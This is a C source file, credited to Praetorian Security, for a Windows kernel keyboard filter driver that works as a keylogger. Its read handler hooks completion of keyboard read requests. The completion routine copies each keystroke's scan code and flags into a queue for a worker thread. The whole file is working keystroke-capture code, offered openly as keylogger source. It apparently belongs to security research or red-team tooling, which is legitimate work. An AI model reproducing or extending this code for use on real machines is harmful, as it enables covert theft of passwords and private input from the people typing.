/*
 * Copyright 2022 Praetorian Security, Inc.
 *
 * Licensed under the Apache License, Version 2.0 (the "License");
 * you may not use this file except in compliance with the License.
 * You may obtain a copy of the License at
 *
 *      http://www.apache.org/licenses/LICENSE-2.0
 *
 * Unless required by applicable law or agreed to in writing, software
 * distributed under the License is distributed on an "AS IS" BASIS,
 * WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
 * See the License for the specific language governing permissions and
 * limitations under the License.
 */

#include <ntddk.h>

#include "keylog.h"
#include "ntundoc.h"
#include "klogworker.h"
#include "keyboardio.h"

NTSTATUS 
KeylogRead(
		IN PDEVICE_OBJECT DeviceObject, 
		IN PIRP irp
		)

/*++

  Routine Description:

  	Tag IRP_MJ_READ requests for completion so we can get the keystrokes returned
	by lower level keyboard drivers

  Arguments:

	Standard IRP_MJ_READ handler	

  Return Value:

	Returns status value returned by underlying driver on the device stack

--*/

{
	PIO_STACK_LOCATION currentIrpStack;
	PIO_STACK_LOCATION nextIrpStack;

	currentIrpStack = IoGetCurrentIrpStackLocation(irp);
	nextIrpStack = IoGetNextIrpStackLocation(irp);
	*nextIrpStack = *currentIrpStack;

	IoSetCompletionRoutine(irp, 
			       KeylogReadCompletion,
			       DeviceObject, 
			       TRUE, 
			       TRUE, 
			       TRUE);

	return IoCallDriver(((PKEYLOG_DEVICE_EXTENSION) DeviceObject->DeviceExtension)->KeyboardDevice ,irp);
}

NTSTATUS 
KeylogReadCompletion(
		IN PDEVICE_OBJECT DeviceObject, 
		IN PIRP irp, 
		IN PVOID Context
		)

/*++

  Routine Description:

  	Add intercepted keystrokes to work queue for processing by worker thread. Needed
	due to the fact that keystroke processing must operate at an IRQL of PASSIVE_LEVEL

  Arguments:
  
  	DeviceObject - Device Object associated with the completion routine

	irp - I/O Request Packet being completed

	Context - Pointer to keylogger device object

  Return Value:
  
  	Returns an NTSTATUS value preserving the values/sttaus returned by underlying
	devices on the stack

--*/

{
	unsigned int count, NumKeys;
	KEY_DATA *kData;
	PKEYBOARD_INPUT_DATA keys;
	PKEYLOG_DEVICE_EXTENSION KeylogExtension;

	UNREFERENCED_PARAMETER(Context);

	KeylogExtension = (PKEYLOG_DEVICE_EXTENSION) DeviceObject->DeviceExtension;

	if(!NT_SUCCESS(irp->IoStatus.Status)) {
		DbgPrint("[Keylog] IRP_MJ_READ IRP Failed Skipping Processing IRP");
		goto cleanup_irp_failed;
	}

	keys     = (PKEYBOARD_INPUT_DATA)irp->AssociatedIrp.SystemBuffer;
	NumKeys = (unsigned int)irp->IoStatus.Information / sizeof(KEYBOARD_INPUT_DATA);

	for(count = 0; count < NumKeys; count++) {

		//
		// Add keyboard data to work queue
		//

		kData = (KEY_DATA*)ExAllocatePool(NonPagedPool,sizeof(KEY_DATA));

		if(kData == NULL) {
			DbgPrint("[Keylog] Failed to allocate memory for kData structure");
			break;
		}

		kData->KeyData = (char)keys[count].MakeCode;
		kData->KeyFlags = (char)keys[count].Flags;

		ExInterlockedInsertTailList(&KeylogExtension->QueueListHead,
				&kData->ListEntry,
				&KeylogExtension->lockQueue);

		//
		// Let worker thread know we added new item to queue if it is sleeping 
		//

		KeReleaseSemaphore(&KeylogExtension->semQueue, 0, 1, FALSE);
	}

cleanup_irp_failed:

	if(irp->PendingReturned) {
		IoMarkIrpPending(irp);
	}

	return irp->IoStatus.Status;
}
